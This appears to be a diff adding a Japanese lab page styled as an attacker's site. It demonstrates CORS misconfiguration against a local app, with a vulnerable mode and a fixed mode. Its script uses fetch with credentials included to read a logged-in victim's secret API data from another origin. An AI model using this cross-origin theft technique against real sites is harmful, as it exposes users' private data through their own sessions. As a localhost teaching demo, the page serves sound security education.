@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>evil.example（攻撃者サイト）</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 760px; margin: 2rem auto; padding: 0 16px; line-height: 1.7; }
+    .box { background:#111; color:#0f0; padding:1rem; white-space:pre-wrap; border-radius:6px; min-height:3rem; }
+    button { font-size:1rem; padding:.5rem 1rem; margin:.25rem .25rem 0 0; cursor:pointer; }
+    code { background:#eee; padding:0 .3em; border-radius:3px; }
+  </style>
+</head>
+<body>
+  <h1>😈 攻撃者サイト <small>http://127.0.0.1:9000</small></h1>
+  <p>このページは app（<code>http://127.0.0.1:8080</code>）とは<b>別オリジン</b>。
+     victim のブラウザの中で動くこのJSが、<b>victim のログインCookieを使って</b>
+     app の秘密API <code>/cors/api</code> の応答を<b>読み取れてしまうか</b>を試す。</p>
+
+  <p>手順：まず
+     <a href="http://127.0.0.1:8080/cors" target="_blank">社内ポータル(/cors)</a>
+     を一度開いて victim のログインCookieを作る → 戻って下のボタンを押す。</p>
+
+  <button onclick="steal('vuln')">脆弱版APIを盗む(mode=vuln)</button>
+  <button onclick="steal('fixed')">対策版APIを盗む(mode=fixed)</button>
+
+  <h3>結果</h3>
+  <div id="out" class="box">（ボタンを押すと表示）</div>
+
+  <script>
+    function steal(mode) {
+      const out = document.getElementById('out');
+      out.textContent = '取得中... (mode=' + mode + ')';
+      // credentials:'include' = victim の app に対するCookieを付けて送る（＝なりすまし）
+      fetch('http://127.0.0.1:8080/cors/api?mode=' + mode, { credentials: 'include' })
+        .then(r => r.text())
+        .then(t => {
+          out.textContent =
+            '✅ 読めてしまった（情報漏洩）  mode=' + mode + '\n' +
+            'victim の秘密データ: ' + t + '\n\n' +
+            '→ 脆弱版はブラウザが「このオリジンに応答を読ませてよい」と判断した。';
+        })
+        .catch(e => {
+          out.textContent =
+            '🛡 ブラウザが遮断（CORSエラー）  mode=' + mode + '\n' +
+            String(e) + '\n\n' +
+            '→ 対策版は許可リストに無いオリジンにCORS許可を出さないので、\n' +
+            '   応答はネットワーク上には届いても、JSからは読み取れない。';
+        });
+    }
+  </script>
+</body>
+</html>
